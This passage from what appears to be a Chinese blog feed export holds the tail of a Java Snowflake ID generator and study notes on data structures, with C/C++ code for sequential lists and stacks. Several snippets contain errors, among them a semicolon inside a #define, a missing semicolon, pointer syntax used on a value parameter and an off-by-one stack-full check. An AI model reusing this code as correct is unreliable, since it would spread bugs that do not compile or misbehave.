机器ID偏左移12位</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">long</span> workerIdShift = sequenceBits;</span><br><span class="line">    <span class="comment">// 数据中心ID左移17位</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">long</span> datacenterIdShift = sequenceBits + workerIdBits;</span><br><span class="line">    <span class="comment">// 时间毫秒左移22位</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">long</span> timestampLeftShift = sequenceBits + workerIdBits + datacenterIdBits;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">long</span> sequenceMask = -<span class="number">1L</span> ^ (-<span class="number">1L</span> &lt;&lt; sequenceBits);</span><br><span class="line">    <span class="comment">/* 上次生产id时间戳 */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">long</span> lastTimestamp = -<span class="number">1L</span>;</span><br><span class="line">    <span class="comment">// 0，并发控制</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span> sequence = <span class="number">0L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">long</span> workerId;</span><br><span class="line">    <span class="comment">// 数据标识id部分</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">long</span> datacenterId;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">IdWorker</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.datacenterId = getDatacenterId(maxDatacenterId);</span><br><span class="line">        <span class="keyword">this</span>.workerId = getMaxWorkerId(datacenterId, maxWorkerId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> workerId     工作机器ID</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> datacenterId 序列号</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">IdWorker</span><span class="params">(<span class="keyword">long</span> workerId, <span class="keyword">long</span> datacenterId)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (workerId &gt; maxWorkerId || workerId &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(String.format(<span class="string">&quot;worker Id can&#x27;t be greater than %d or less than 0&quot;</span>, maxWorkerId));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (datacenterId &gt; maxDatacenterId || datacenterId &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(String.format(<span class="string">&quot;datacenter Id can&#x27;t be greater than %d or less than 0&quot;</span>, maxDatacenterId));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.workerId = workerId;</span><br><span class="line">        <span class="keyword">this</span>.datacenterId = datacenterId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取下一个ID</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">long</span> <span class="title">nextId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">long</span> timestamp = timeGen();</span><br><span class="line">        <span class="keyword">if</span> (timestamp &lt; lastTimestamp) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(String.format(<span class="string">&quot;Clock moved backwards.  Refusing to generate id for %d milliseconds&quot;</span>, lastTimestamp - timestamp));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (lastTimestamp == timestamp) &#123;</span><br><span class="line">            <span class="comment">// 当前毫秒内，则+1</span></span><br><span class="line">            sequence = (sequence + <span class="number">1</span>) &amp; sequenceMask;</span><br><span class="line">            <span class="keyword">if</span> (sequence == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// 当前毫秒内计数满了，则等待下一秒</span></span><br><span class="line">                timestamp = tilNextMillis(lastTimestamp);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            sequence = <span class="number">0L</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        lastTimestamp = timestamp;</span><br><span class="line">        <span class="comment">// ID偏移组合生成最终的ID，并返回ID</span></span><br><span class="line">        <span class="keyword">long</span> nextId = ((timestamp - twepoch) &lt;&lt; timestampLeftShift)</span><br><span class="line">            | (datacenterId &lt;&lt; datacenterIdShift)</span><br><span class="line">            | (workerId &lt;&lt; workerIdShift) | sequence;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> nextId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">long</span> <span class="title">tilNextMillis</span><span class="params">(<span class="keyword">final</span> <span class="keyword">long</span> lastTimestamp)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">long</span> timestamp = <span class="keyword">this</span>.timeGen();</span><br><span class="line">        <span class="keyword">while</span> (timestamp &lt;= lastTimestamp) &#123;</span><br><span class="line">            timestamp = <span class="keyword">this</span>.timeGen();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> timestamp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">long</span> <span class="title">timeGen</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> System.currentTimeMillis();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * &lt;p&gt;</span></span><br><span class="line"><span class="comment">     * 获取 maxWorkerId</span></span><br><span class="line"><span class="comment">     * &lt;/p&gt;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">static</span> <span class="keyword">long</span> <span class="title">getMaxWorkerId</span><span class="params">(<span class="keyword">long</span> datacenterId, <span class="keyword">long</span> maxWorkerId)</span> </span>&#123;</span><br><span class="line">        StringBuffer mpid = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        mpid.append(datacenterId);</span><br><span class="line">        String name = ManagementFactory.getRuntimeMXBean().getName();</span><br><span class="line">        <span class="keyword">if</span> (!name.isEmpty()) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * GET jvmPid</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            mpid.append(name.split(<span class="string">&quot;@&quot;</span>)[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * MAC + PID 的 hashcode 获取16个低位</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">return</span> (mpid.toString().hashCode() &amp; <span class="number">0xffff</span>) % (maxWorkerId + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * &lt;p&gt;</span></span><br><span class="line"><span class="comment">     * 数据标识id部分</span></span><br><span class="line"><span class="comment">     * &lt;/p&gt;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">static</span> <span class="keyword">long</span> <span class="title">getDatacenterId</span><span class="params">(<span class="keyword">long</span> maxDatacenterId)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">long</span> id = <span class="number">0L</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            InetAddress ip = InetAddress.getLocalHost();</span><br><span class="line">            NetworkInterface network = NetworkInterface.getByInetAddress(ip);</span><br><span class="line">            <span class="keyword">if</span> (network == <span class="keyword">null</span>) &#123;</span><br><span class="line">                id = <span class="number">1L</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">byte</span>[] mac = network.getHardwareAddress();</span><br><span class="line">                id = ((<span class="number">0x000000FF</span> &amp; (<span class="keyword">long</span>) mac[mac.length - <span class="number">1</span>])</span><br><span class="line">                      | (<span class="number">0x0000FF00</span> &amp; (((<span class="keyword">long</span>) mac[mac.length - <span class="number">2</span>]) &lt;&lt; <span class="number">8</span>))) &gt;&gt; <span class="number">6</span>;</span><br><span class="line">                id = id % (maxDatacenterId + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot; getDatacenterId: &quot;</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>SpringBoot项目</category>
      </categories>
  </entry>
  <entry>
    <title>数据结构</title>
    <url>/post/79666db.html</url>
    <content><![CDATA[<h1 id="第一章-绪论"><a href="#第一章-绪论" class="headerlink" title="第一章 绪论"></a>第一章 绪论</h1><h2 id="1-1-数据结构的基本概念"><a href="#1-1-数据结构的基本概念" class="headerlink" title="1.1 数据结构的基本概念"></a>1.1 数据结构的基本概念</h2><h2 id="1-2-算法的基本概念"><a href="#1-2-算法的基本概念" class="headerlink" title="1.2 算法的基本概念"></a>1.2 算法的基本概念</h2><h3 id="1-2-1-时间复杂度"><a href="#1-2-1-时间复杂度" class="headerlink" title="1.2.1 时间复杂度"></a>1.2.1 时间复杂度</h3><p>　　事前预估算法时间开销T(n)与问题规模n的关系。分析算法操作的执行次数x和问题模型n的关系x=f(n)。<span id="more"></span></p>
<p><strong>常见数量级关系</strong>：（常对幂指阶）</p>
<script type="math/tex; mode=display">
O(1)<O(\log_2n)<O(n)<O(nlog_2n)<O(n^2)<O(n^3)<O(2^n)<O(n!)<O(n^n)</script><p><a href="https://imgtu.com/i/6boW7T"><img src="https://z3.ax1x.com/2021/03/24/6boW7T.jpg" alt="6boW7T.jpg" style="zoom:80%;" /></a></p>
<h3 id="1-2-2-空间复杂度"><a href="#1-2-2-空间复杂度" class="headerlink" title="1.2.2 空间复杂度"></a>1.2.2 空间复杂度</h3><p>　　无论问题规模怎么变，算法运行所需的内存空间都是固定的常量。</p>
<h1 id="第二章-线性表"><a href="#第二章-线性表" class="headerlink" title="第二章 线性表"></a>第二章 线性表</h1><h2 id="2-1-线性表的基本概念"><a href="#2-1-线性表的基本概念" class="headerlink" title="2.1 线性表的基本概念"></a>2.1 线性表的基本概念</h2><p>　　由<font color="ff0000">零个或多个</font>数据元素组成的<font color="ff0000">有序</font>序列。 特性：有序，类型相同，有限。</p>
<h3 id="2-1-1-数学定义"><a href="#2-1-1-数学定义" class="headerlink" title="2.1.1 数学定义"></a>2.1.1 数学定义</h3><p>　　线性表是具有相同类型的n(n≥0)个数据元素的有限序列（a1,a2,a3,…,an-1,an），ai是表项，n是表长度。存在前驱后继。</p>
<h3 id="2-1-2-线性表的操作"><a href="#2-1-2-线性表的操作" class="headerlink" title="2.1.2 线性表的操作"></a>2.1.2 线性表的操作</h3><ul>
<li>创建线性表</li>
<li>销毁线性表</li>
<li>清空线性表</li>
<li>将元素插入线性表</li>
<li>将元素从线性表中删除</li>
<li>获取线性表中某个位置的元素</li>
<li>获取线性表的长度</li>
</ul>
<p>线性表的抽象数据类型定义：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">ADT线性表（List）</span><br><span class="line">    </span><br><span class="line">Data</span><br><span class="line">　　线性表的数据对象集合为&#123;a1,a2,a3,...,an<span class="number">-1</span>,an&#125;，其中，除第一个元素a1外，每个元素有且只有一个直接前驱元素，直接后继元素同理，数据元素之间的关系是一一对应的。</span><br><span class="line">    </span><br><span class="line">Operation（操作）</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化，建立一个空的线性表L</span></span><br><span class="line">InitList(*L);</span><br><span class="line"></span><br><span class="line"><span class="comment">//若线性表为空，返回true，否则返回false</span></span><br><span class="line">ListEmpty(L);</span><br><span class="line"></span><br><span class="line"><span class="comment">//将线性表清空</span></span><br><span class="line">ClearList(*L);</span><br><span class="line"></span><br><span class="line"><span class="comment">//将线性表L中的第i个位置的元素返回给e</span></span><br><span class="line">GetElem(L,i,*e);</span><br><span class="line"></span><br><span class="line"><span class="comment">//在线性表L中查找与给定值e相等的元素，如果查找成功，返回该元素在表中序号表示成功，否则返回0表示失败</span></span><br><span class="line">LocateElem(L,e)</span><br><span class="line"></span><br><span class="line"><span class="comment">//在线性表L中的第i个位置插入新元素e</span></span><br><span class="line">ListInsert(*L,i,e);</span><br><span class="line"></span><br><span class="line"><span class="comment">//删除线性表L中的第i个位置元素，并用e返回其值</span></span><br><span class="line">ListDelete(*L,i,*e);</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回线性表L的元素个数</span></span><br><span class="line">ListLength(L);;</span><br><span class="line"></span><br><span class="line"><span class="comment">//销毁线性表</span></span><br><span class="line">DestroyList(*L);</span><br><span class="line"></span><br><span class="line">endADT</span><br></pre></td></tr></table></figure>
<h2 id="2-2-线性表的存储方式"><a href="#2-2-线性表的存储方式" class="headerlink" title="2.2 线性表的存储方式"></a>2.2 线性表的存储方式</h2><p><a href="https://imgtu.com/i/6bo3fH"><img src="https://z3.ax1x.com/2021/03/24/6bo3fH.jpg" alt="6bo3fH.jpg" style="zoom:67%;" /></a></p>
<p>如上图，线性表的存储细分以下两种：</p>
<p>1.将所有数据一次存储在连续的整块屋里空间中，叫做<font color="#008000">顺序存储结构</font>；</p>
<p>2.数据分散的存储在物理空间中，通过一根线保存着它们之间的逻辑关系，<font color="#008000">链式存储结构</font>。</p>
<h2 id="2-3-顺序表"><a href="#2-3-顺序表" class="headerlink" title="2.3 顺序表"></a>2.3 顺序表</h2><p>　　顺序表不仅存在“一对一”的数据关系，对数据的物理存储结构也有要求。<font color="#b22222">顺序表存储结构时，会提前申请一整块足够大小的屋里空间，然后将数据依次存储起来，存储时做到数据元素之间不留一丝细缝</font>。</p>
<h3 id="2-3-1-顺序表的初始化"><a href="#2-3-1-顺序表的初始化" class="headerlink" title="2.3.1 顺序表的初始化"></a>2.3.1 顺序表的初始化</h3><p>　　　顺序表需要实时记录一下两项数据：</p>
<p>1.顺序表申请的存储容量；</p>
<p>2.顺序表的长度，也就是表中存储数据元素的个数；</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">提示：正常状态下，顺序表申请的存储容量要大于顺序表的长度</span><br></pre></td></tr></table></figure>
<p>因此，需要自定义顺序表</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Table</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> *head;<span class="comment">//声明了一个名为head的长度不确定的数组</span></span><br><span class="line">    <span class="keyword">int</span> length;<span class="comment">//记录当前顺序表的长度</span></span><br><span class="line">    <span class="keyword">int</span> size;<span class="comment">//记录顺序表分配的存储容量</span></span><br><span class="line">&#125;table;</span><br></pre></td></tr></table></figure>
<p>注意：head是未初始化的动态数组。</p>
<p>初步建立一个顺序表，需要如下工作：</p>
<ul>
<li>给head动态数据申请足够大小的物理空间</li>
<li>给size和length赋初始值</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Size 5;<span class="comment">//对Size进行宏定义，表示顺序表申请空间的大小</span></span></span><br><span class="line"><span class="function">table <span class="title">InitTable</span><span class="params">()</span></span>&#123;</span><br><span class="line">    table t;</span><br><span class="line">    t.head = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(Size *<span class="keyword">sizeof</span>(<span class="keyword">int</span>));<span class="comment">//构造空的顺序表，动态申请存储空间</span></span><br><span class="line">    <span class="keyword">if</span>(!t.head)&#123;<span class="comment">//申请失败，作为提示直接退出程序</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;初始化失败&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    t.length = <span class="number">0</span>;<span class="comment">//空表的长度初始化为0</span></span><br><span class="line">    t.size = Size;<span class="comment">//空表的初始化存储空间为Size</span></span><br><span class="line">    <span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="2-3-2-顺序表的插入元素"><a href="#2-3-2-顺序表的插入元素" class="headerlink" title="2.3.2 顺序表的插入元素"></a>2.3.2 顺序表的插入元素</h3><ul>
<li>插入位置不合理，抛出异常</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ERROR 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TRUE 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FALSE 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> Status;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始条件：顺序线性表L已存在，1&lt;=i&lt;=ListLength(L).</span></span><br><span class="line"><span class="comment">// 操作结果：在L中第i个位置之前插入新的数据元素e，L长度+1</span></span><br><span class="line"><span class="function">Status <span class="title">ListInsert</span><span class="params">(List *L, <span class="keyword">int</span> i, ElemType e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> k;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (L-&gt;length == MAXSIZE) <span class="comment">//顺序线性表已经满了</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">1</span> || i &gt; L-&gt;length + <span class="number">1</span>) <span class="comment">//当i不在范围内时</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (i &lt;= L-&gt;length) <span class="comment">//若插入数据位置不在表尾，i=length+1就是在表尾，直接添加就可以</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 将要插入位置后数据元素向后移动一位</span></span><br><span class="line">        <span class="keyword">for</span> (k = L-&gt;length - <span class="number">1</span>; k &gt;= i - <span class="number">1</span>; k--)</span><br><span class="line">        &#123;</span><br><span class="line">            L-&gt;data[k + <span class="number">1</span>] = L-&gt;data[k];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    L-&gt;data[i - <span class="number">1</span>] = e; <span class="comment">//将新元素插入</span></span><br><span class="line">    L-&gt;length++;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="2-3-3-顺序表的删除元素"><a href="#2-3-3-顺序表的删除元素" class="headerlink" title="2.3.3 顺序表的删除元素"></a>2.3.3 顺序表的删除元素</h3><ul>
<li>删除位置不合理，抛出异常</li>
<li>取出删除元素</li>
<li>从删除元素位置开始遍历到最后一个元素位置，分别将他们向前移动一个位置</li>
<li>表长-1</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ERROR 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TRUE 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FALSE 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> Status;</span><br><span class="line"></span><br><span class="line"><span class="function">Status <span class="title">ListDelete</span><span class="params">(List *L, <span class="keyword">int</span> i, ElemType *e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> k;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (L-&gt;length == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">1</span> || i &gt; L-&gt;length)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *e = L-&gt;data[i - <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (i &lt; L-&gt;length)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (k = i; k &lt; L-&gt;length; k++)</span><br><span class="line">        &#123;</span><br><span class="line">            L-&gt;data[k - <span class="number">1</span>] = L-&gt;data[k];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    L-&gt;length--;</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="2-3-4-顺序表的查找元素"><a href="#2-3-4-顺序表的查找元素" class="headerlink" title="2.3.4 顺序表的查找元素"></a>2.3.4 顺序表的查找元素</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ERROR 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TRUE 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FALSE 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> Status;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Status是函数的类型，其值是函数结果状态代码，如OK等。</span></span><br><span class="line"><span class="comment">// 初始条件：顺序线性表L已存在， 1 &lt;= i &lt;= ListLength(L)</span></span><br><span class="line"><span class="comment">// 操作结果：用e返回L中第i个数据元素的值</span></span><br><span class="line"></span><br><span class="line"><span class="function">Status <span class="title">GetElem</span><span class="params">(List L, <span class="keyword">int</span> i, ElemType *e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (L-&gt;length == <span class="number">0</span> || i &lt; <span class="number">1</span> || i &gt; L-&gt;length)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *e = L-&gt;data[i - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="2-3-5-顺序表的更改元素"><a href="#2-3-5-顺序表的更改元素" class="headerlink" title="2.3.5 顺序表的更改元素"></a>2.3.5 顺序表的更改元素</h3><h2 id="2-4-单链表"><a href="#2-4-单链表" class="headerlink" title="2.4 单链表"></a>2.4 单链表</h2><h3 id="2-4-1-获取链表第i个数据"><a href="#2-4-1-获取链表第i个数据" class="headerlink" title="2.4.1 获取链表第i个数据"></a>2.4.1 获取链表第i个数据</h3><ul>
<li>声明一个节点p指向链表第一个节点，初始化j从1开始</li>
<li>当j&lt;i时，就遍历链表，让p的指针向后移动，不断指向下一节点，j+1</li>
<li>若到链表末尾p为空，则说明第i个元素不存在</li>
<li>否则查找成功，返回节点p的数据</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="2-5-双向链表"><a href="#2-5-双向链表" class="headerlink" title="2.5 双向链表"></a>2.5 双向链表</h2><h1 id="第三章-栈和队列"><a href="#第三章-栈和队列" class="headerlink" title="第三章 栈和队列"></a>第三章 栈和队列</h1><h2 id="3-1-什么是栈"><a href="#3-1-什么是栈" class="headerlink" title="3.1 什么是栈"></a>3.1 什么是栈</h2><p>　　栈就是一种只能从表的一段存储数据且遵循“先进后出”原则的线性存储结构。压栈（push），弹栈（pop）。</p>
<p><img src="https://ss0.bdstatic.com/70cFvHSh_Q1YnxGkpoWK1HF6hhy/it/u=1257338926,4293580614&fm=11&gp=0.jpg" alt="123" style="zoom: 50%;" /></p>
<p>栈遵循<font color="ff000">先进后出</font>，栈存储结构的实现有以下两种方式：</p>
<ul>
<li>顺序栈</li>
<li>链栈</li>
</ul>
<h2 id="3-2-顺序栈及基本操作"><a href="#3-2-顺序栈及基本操作" class="headerlink" title="3.2 顺序栈及基本操作"></a>3.2 顺序栈及基本操作</h2><h3 id="3-2-1-顺序栈的定义"><a href="#3-2-1-顺序栈的定义" class="headerlink" title="3.2.1 顺序栈的定义"></a>3.2.1 顺序栈的定义</h3><p><img src="https://user-gold-cdn.xitu.io/2018/7/20/164b52876a6a2c70?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="11" style="zoom:80%;" /></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span>   </span><br><span class="line">    <span class="keyword">int</span> data[maxsize];    <span class="comment">//定义一个数组大小为maxsize的数组，用来存放栈中数据元素    </span></span><br><span class="line">    <span class="keyword">int</span> top;              <span class="comment">//栈顶指针                 </span></span><br><span class="line">&#125;SqStack;				  <span class="comment">//顺序栈定义</span></span><br></pre></td></tr></table></figure>
<h3 id="3-2-2-顺序栈的操作"><a href="#3-2-2-顺序栈的操作" class="headerlink" title="3.2.2 顺序栈的操作"></a>3.2.2 顺序栈的操作</h3><p>可以参考<a href="http://data.biancheng.net/view/170.html">顺序栈的操作C语言版</a></p>
<p>对于顺序栈，一共有4个要素，包括两个特殊状态和两个操作</p>
<p>特殊状态：</p>
<p>1）栈空状态：<code>st.top == -1</code>，也有的用<code>st.top = 0</code>表示，这时候栈顶位置为0；</p>
<p>2）栈满状态：<code>st.top == maxsize - 1</code>表示栈满，maxsize是栈中最大元素个数，maxsize-1为栈满时栈顶元素在数组中的位置，因为数组位置是从0开始的。</p>
<p>操作：</p>
<p>进栈和出栈</p>
<p><img src="https://user-gold-cdn.xitu.io/2018/7/20/164b528765cf96a3?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="1234" style="zoom: 67%;" /></p>
<p>以下是数组实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*源代码*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> DataType;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DataType <span class="built_in">stack</span>[MAXSIZE];</span><br><span class="line">    <span class="keyword">int</span> top;  </span><br><span class="line">&#125;SeqStack;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*初始化栈,把栈初始化为空，把栈顶指针置为-1*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitStack</span><span class="params">(SeqStack * s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    s-&gt;top = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*判空操作，当栈顶指针为top 为-1，栈为空*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">StackEmpty</span><span class="params">(SeqStack s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (s.top == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*入栈操作，栈顶指针top++，然后将data值压入栈中*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">StackPush</span><span class="params">(SeqStack* s, DataType data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (s-&gt;top == MAXSIZE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span 